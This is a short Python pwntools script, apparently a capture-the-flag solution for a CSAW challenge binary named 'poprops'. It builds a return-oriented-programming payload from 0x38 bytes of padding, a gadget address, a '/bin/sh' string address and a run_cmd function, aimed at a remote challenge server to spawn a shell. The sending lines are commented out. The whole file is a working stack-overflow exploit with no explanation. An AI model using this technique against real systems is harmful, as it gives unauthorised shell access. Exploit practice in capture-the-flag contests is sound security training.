#!/usr/bin/env python
from pwn import *

e = ELF("./poprops")

gadget = 0x4005d5
run_cmd = e.symbols["run_cmd"]
binsh = 0x400698

#p = process("../poprops.1")
p = remote("pwn.chal.csaw.io",10107)

p.recvuntil("??")

chain = "A" * 0x38 + "".join(map(p64,[
    gadget,
    binsh,
    run_cmd
]))


print(len(chain))
#p.sendline(chain)
#p.interactive()
